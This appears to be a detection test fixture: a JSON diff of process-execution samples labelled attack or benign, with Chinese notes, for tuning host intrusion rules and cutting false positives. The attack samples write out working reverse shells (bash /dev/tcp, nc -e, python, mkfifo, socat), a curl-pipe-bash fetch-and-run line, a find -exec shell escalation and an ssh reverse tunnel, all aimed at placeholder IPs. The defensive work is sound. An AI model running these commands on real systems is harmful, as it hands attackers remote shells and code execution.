@@ -1,0 +1,291 @@
+{
+  "samples": [
+    {
+      "name": "attack/reverse-shell-bash-devtcp",
+      "label": "attack",
+      "technique": "T1059.004",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/bin/bash",
+        "cmdline": "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1",
+        "pid": "4001",
+        "ppid": "3900",
+        "username": "root"
+      },
+      "note": "经典 bash 反弹 shell"
+    },
+    {
+      "name": "attack/reverse-shell-nc-e",
+      "label": "attack",
+      "technique": "T1059.004",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/nc",
+        "cmdline": "nc -e /bin/sh 198.51.100.7 4444",
+        "pid": "4002",
+        "ppid": "3900",
+        "username": "www-data"
+      },
+      "note": "nc -e 反弹 shell"
+    },
+    {
+      "name": "attack/curl-pipe-shell",
+      "label": "attack",
+      "technique": "T1059.004",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/bin/sh",
+        "cmdline": "sh -c curl -s http://198.51.100.7/a.sh | bash",
+        "pid": "4003",
+        "ppid": "3900",
+        "username": "root"
+      },
+      "note": "下载即执行"
+    },
+    {
+      "name": "attack/python-reverse-shell",
+      "label": "attack",
+      "technique": "T1059.006",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/python3",
+        "cmdline": "python3 -c import socket,os,pty;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);pty.spawn(\"/bin/sh\")",
+        "pid": "4004",
+        "ppid": "3900",
+        "username": "root"
+      },
+      "note": "python 反弹 shell"
+    },
+    {
+      "name": "attack/webshell-spawns-shell",
+      "label": "attack",
+      "technique": "T1505.003",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/bin/sh",
+        "cmdline": "sh -c whoami",
+        "parent_exe": "/usr/sbin/nginx",
+        "pid": "4005",
+        "ppid": "1200",
+        "username": "www-data"
+      },
+      "note": "Web 服务进程派生 shell，webshell 的典型形态"
+    },
+    {
+      "name": "benign/ansible-runs-shell-module",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/bin/sh",
+        "cmdline": "sh -c /usr/bin/python3 /home/deploy/.ansible/tmp/ansible-tmp-1690000000/AnsiballZ_setup.py",
+        "parent_exe": "/usr/bin/sshd",
+        "pid": "5001",
+        "ppid": "2100",
+        "username": "deploy"
+      },
+      "note": "配置管理执行远程模块。形态上就是「远程连接派生 shell 跑 python」，与攻击极像，但它是常态运维——把它调成告警会让值班每次发布都被打扰"
+    },
+    {
+      "name": "benign/curl-download-to-file",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/curl",
+        "cmdline": "curl -sSL https://mirrors.internal/repo/pkg.tar.gz -o /tmp/pkg.tar.gz",
+        "pid": "5002",
+        "ppid": "2100",
+        "username": "deploy"
+      },
+      "note": "只下载不执行。与 curl|bash 只差一个管道，规则若按「curl 出现即告警」写就会在这里误报"
+    },
+    {
+      "name": "benign/nc-port-check",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/nc",
+        "cmdline": "nc -z -w2 db.internal 3306",
+        "pid": "5003",
+        "ppid": "2100",
+        "username": "monitor"
+      },
+      "note": "健康检查探测端口。用的是 nc，但没有 -e，不构成执行"
+    },
+    {
+      "name": "benign/python-app-start",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/python3",
+        "cmdline": "python3 /opt/app/manage.py runserver 0.0.0.0:8000",
+        "pid": "5004",
+        "ppid": "1",
+        "username": "app"
+      },
+      "note": "业务进程启动，含 socket 监听语义但完全正常"
+    },
+    {
+      "name": "benign/nginx-reload",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/sbin/nginx",
+        "cmdline": "nginx -s reload",
+        "parent_exe": "/usr/bin/systemd",
+        "pid": "5005",
+        "ppid": "1",
+        "username": "root"
+      },
+      "note": "nginx 自身重载。父进程是 nginx 相关但没有派生 shell"
+    },
+    {
+      "name": "benign/logrotate-postrotate",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/bin/sh",
+        "cmdline": "sh -c /usr/bin/systemctl reload nginx",
+        "parent_exe": "/usr/sbin/logrotate",
+        "pid": "5006",
+        "ppid": "2200",
+        "username": "root"
+      },
+      "note": "日志轮转的 postrotate 钩子。root 身份派生 shell 执行命令，形态与攻击一致，靠父进程才能区分"
+    },
+    {
+      "name": "benign/diag-dmesg-grep-i",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/bash",
+        "cmdline": "sh -c dmesg | grep eth0 | grep -i \"Link is up\"",
+        "pid": "5101",
+        "ppid": "5100",
+        "username": "root"
+      },
+      "note": "诊断脚本查网卡链路状态。grep -i 的 -i 是忽略大小写，不是 bash -i 交互 shell；旧规则把它当成反弹 shell"
+    },
+    {
+      "name": "benign/diag-ethtool-grep-i",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/bash",
+        "cmdline": "sh -c ethtool eth0 | grep -i Speed",
+        "pid": "5102",
+        "ppid": "5100",
+        "username": "root"
+      },
+      "note": "诊断脚本查网卡速率，同上"
+    },
+    {
+      "name": "benign/agent-enroll-script",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/bash",
+        "cmdline": "bash -c umask 077; head -c 64 > /root/.mxcwpp-enroll; grep -i token /etc/mxcwpp-agent/agent.env || true",
+        "pid": "5103",
+        "ppid": "5099",
+        "username": "root"
+      },
+      "note": "agent 安装写 enroll 令牌，命令里带 grep -i"
+    },
+    {
+      "name": "benign/interactive-bash-login",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/bash",
+        "cmdline": "bash -i",
+        "pid": "5104",
+        "ppid": "5098",
+        "username": "centos"
+      },
+      "note": "运维登录后开交互 shell，没有任何网络重定向"
+    },
+    {
+      "name": "attack/reverse-shell-mkfifo-nc",
+      "label": "attack",
+      "technique": "T1059.004",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/bin/bash",
+        "cmdline": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 203.0.113.9 4444 >/tmp/f",
+        "pid": "4011",
+        "ppid": "3900",
+        "username": "www-data"
+      },
+      "note": "mkfifo + nc 的反弹 shell，不含 /dev/tcp"
+    },
+    {
+      "name": "attack/reverse-shell-bash-i-socat",
+      "label": "attack",
+      "technique": "T1059.004",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/bin/bash",
+        "cmdline": "bash -i 2>&1 | socat - TCP:203.0.113.9:4444",
+        "pid": "4012",
+        "ppid": "3900",
+        "username": "www-data"
+      },
+      "note": "bash -i 交给 socat 回连"
+    },
+    {
+      "name": "attack/lolbin-find-exec-sh",
+      "label": "attack",
+      "technique": "T1059.004",
+      "data_type": 3000,
+      "fields": {
+        "event_type": "process_exec",
+        "exe": "/usr/bin/find",
+        "cmdline": "find . -exec /bin/sh -p ; -quit",
+        "pid": "4031",
+        "ppid": "3900",
+        "username": "www-data"
+      },
+      "note": "GTFOBins 经典用法：借 find -exec 起 shell（配合 SUID 可提权）"
+    },
+    {
+      "name": "attack/ssh-remote-port-forward",
+      "label": "attack",
+      "technique": "T1572",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/ssh",
+        "cmdline": "ssh -N -R 9000:127.0.0.1:22 relay@198.51.100.7",
+        "pid": "4301",
+        "ppid": "4300",
+        "username": "www-data"
+      },
+      "note": "ssh 客户端建立反向端口转发，把内网端口暴露到外部"
+    },
+    {
+      "name": "benign/sshd-daemon-reexec",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/sbin/sshd",
+        "cmdline": "/usr/sbin/sshd -D -R",
+        "pid": "1201",
+        "ppid": "1",
+        "username": "root"
+      },
+      "note": "sshd 守护进程前台运行（-D）并在每个连接上重新执行自身（-R），参数与 ssh 隧道参数同名，但不是隧道"
+    },
+    {
+      "name": "benign/cron-script-output-to-devnull",
+      "label": "benign",
+      "data_type": 3000,
+      "fields": {
+        "exe": "/usr/bin/bash",
+        "cmdline": "/bin/sh -c /usr/sbin/ntpdate -u ntp.example.org >/dev/null 2>&1",
+        "pid": "5101",
+        "ppid": "5100",
+        "username": "root"
+      },
+      "note": "定时任务把输出丢进 /dev/null，几乎所有脚本都这么写，不是在清日志"
+    }
+  ]
+}
